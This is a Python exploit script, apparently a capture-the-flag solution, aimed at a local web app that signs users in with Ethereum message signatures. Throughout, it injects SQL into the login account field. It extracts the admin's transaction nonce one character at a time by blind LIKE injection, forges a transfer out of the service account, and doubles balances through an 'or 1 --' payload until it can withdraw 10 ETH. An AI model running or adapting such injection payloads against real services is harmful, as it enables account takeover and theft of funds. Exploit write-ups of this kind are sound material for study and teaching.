from rich.progress import track
import os
import requests
from eth_account import Account
from eth_account.messages import encode_defunct

HOST = 'http://localhost:3000'
SERVICE_ACCOUNT = '0x71f30b7b29846a5deb9a0913b3c240b61ae027f7'

def sign(message: str, key: bytes) -> str:
    message_hash = encode_defunct(text=message)    
    return '0x' + Account.sign_message(message_hash, key).signature.hex()

def get_address(key: bytes) -> str:
    return Account.from_key(key).address.lower()

def login(key: bytes, account: any, s: requests.Session=None) -> str:
    # account should be a string, or a list of strings

    if s is None: s = requests.Session()
    if type(account) == str:
        message = f'I am {account} and I am signing in'
    else:
        message = f'I am {",".join(account)} and I am signing in'
    signature = sign(message, key)
    return s, s.post(f'{HOST}/api/login', json={
        'account': account,
        'signature': signature
    })

def transfer(key: bytes, from_account: any, to_account: any, nonce: str, s: requests.Session, amount) -> str:
    # Note: s needs to be a session signed in by "from_account"
    if type(from_account) == str:
        from_account_str = from_account
    else:
        from_account_str = ','.join(from_account)

    if type(to_account) == str:
        to_account_str = to_account
    else:
        to_account_str = ','.join(to_account)
    
    message = f'I am {from_account_str} and I am transferring {amount} ETH to {to_account_str} (nonce: {nonce})'
    signature = sign(message, key)
    return s.post(f'{HOST}/api/transfer', json={
        'to_account': to_account,
        'amount': amount,
        'signature': signature
    })

# ===

def leak_admin_transaction_nonce():
    s = requests.Session()

    # Random key for leaking transaction nonce
    key = os.urandom(32)
    address = get_address(key)

    admin_transaction_nonce = ''

    for i in track(range(16)):
        for k in '0123456789abcdef':
            guess = f'{admin_transaction_nonce}{k}'
            account = [f"{address}' OR account = '{SERVICE_ACCOUNT}' AND transaction_nonce LIKE '{guess}%' -- "] + \
                      ['' for _ in range(41)]
            
            _, r = login(key, account, s)
            if r.status_code == 200:
                admin_transaction_nonce += k
                break
        else:
            assert False, 'skill issue'
    return admin_transaction_nonce

def steal_admin_funds(admin_transaction_nonce: str, key: bytes):
    """Steal 0.01 ETH from admin"""

    address = get_address(key)

    # The first session. This is used to steal admin's fund
    account1 = [f"{address}xx' OR account = '{SERVICE_ACCOUNT}' -- "] + ['' for _ in range(41)]
    s, r = login(key, account1)
    assert r.status_code == 200

    # The second session. This is used to receive the funds
    account2 = address
    _, r = login(key, account2)
    assert r.status_code == 200

    r = transfer(key, account1, account2, admin_transaction_nonce, s, amount=0.01)
    assert r.status_code == 500

def prepare_enough_funds(key1: bytes):
    """Repeatedly double the funds until we have enough ETH for the flag"""

    key2 = os.urandom(32)

    address1 = get_address(key1) # This is the account that has 0.01 ETH
    address2 = get_address(key2)

    account1, account2 = address1, address2
    account3 = [f"{address2}' or 1 -- "] + ['' for _ in range(41)]

    s1, r = login(key1, account1)
    assert r.status_code == 200
    s2, r = login(key2, account2)
    assert r.status_code == 200

    for k in range(10):
        # 0.01 * 2**10 = 10.24 >= 10
        r = s1.get(f'{HOST}/api/me')
        nonce = r.json().get('transaction_nonce')
        transfer(key1, account1, account3, nonce, s1, 0.01 * 2**k)
        
        r = s2.get(f'{HOST}/api/me')
        nonce = r.json().get('transaction_nonce')
        transfer(key2, account2, account1, nonce, s2, 0.01 * 2**k)


def main():
    admin_transaction_nonce = leak_admin_transaction_nonce()
    print(f'Admin transaction nonce leaked: {admin_transaction_nonce}.')

    key = os.urandom(32)
    address = get_address(key)
    account = address

    steal_admin_funds(admin_transaction_nonce, key)
    print('Stole 0.01 ETH from admin.')

    prepare_enough_funds(key)
    print('Generated 10 ETH')

    s, r = login(key, account)
    r = s.get(f'{HOST}/api/me')
    assert r.json().get('balance') >= 10 * 10**18
    nonce = r.json().get('transaction_nonce')

    message = f'I am {account} and I am withdrawing 10 ETH (nonce: {nonce})'
    signature = sign(message, key)
    r = s.post(f'{HOST}/api/withdraw', json={
        'amount': '10',
        'signature': signature
    })
    
    final_message = r.json().get('message')
    print(f'Done. Message returned by the API: "{final_message}"')


if __name__ == '__main__':
    main()
